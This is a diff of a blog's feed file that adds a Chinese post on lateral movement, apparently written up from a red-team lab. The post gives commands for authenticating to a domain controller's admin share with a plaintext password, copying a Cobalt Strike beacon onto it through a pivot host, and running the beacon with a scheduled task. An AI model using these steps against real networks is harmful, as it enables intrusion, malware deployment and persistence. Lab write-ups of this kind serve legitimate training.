@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>横向移动</title>
+      <link href="2021/04/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
+      <url>2021/04/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>对 DC(10.10.10.2)目标主机建立共享连接，并查看目标主机共享资源。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.2 /user:administrator <span class="string">&quot;JDredteam666&quot;</span></span><br><span class="line">shell net view \\10.10.10.2</span><br></pre></td></tr></table></figure><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170638929.png" alt="image-20210109170638929"></p><p>列出目标主机 C 盘下目录文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\10.10.10.2\C$</span><br></pre></td></tr></table></figure><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170959454.png" alt="image-20210109170959454"></p><p>将CS木马上传到跳板机。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload C:\Users\asus\Desktop\beacon.exe (C:\Users\Server\Desktop\beacon.exe)</span><br></pre></td></tr></table></figure><p>将server(192.168.111.3)跳板机的木马文件copy到DC(10.10.10.2)目标机的C共享盘下。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\Server\Desktop\beacon.exe \\10.10.10.2\C$</span><br></pre></td></tr></table></figure><p>远程创建Win 2012(192.168.200.66)目标机计划任务执行木马文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /s 10.10.10.2 /u administrator /p <span class="string">&quot;JDredteam&quot;</span> /sc MINUTE /mo 1 /tn <span class="built_in">test</span> /tr <span class="string">&quot;C:\\beacon.exe&quot;</span></span><br></pre></td></tr></table></figure><p>成功上线，该会话为被动连接，不操作的不会回连，如果中转机会话断掉，该会话也会断掉。</p><p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109202117004.png" alt="image-20210109202117004"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网攻防 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 横向移动 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>域操作基本命令</title>
       <link href="2021/04/20/%E5%9F%9F%E6%93%8D%E4%BD%9C%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
       <url>2021/04/20/%E5%9F%9F%E6%93%8D%E4%BD%9C%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
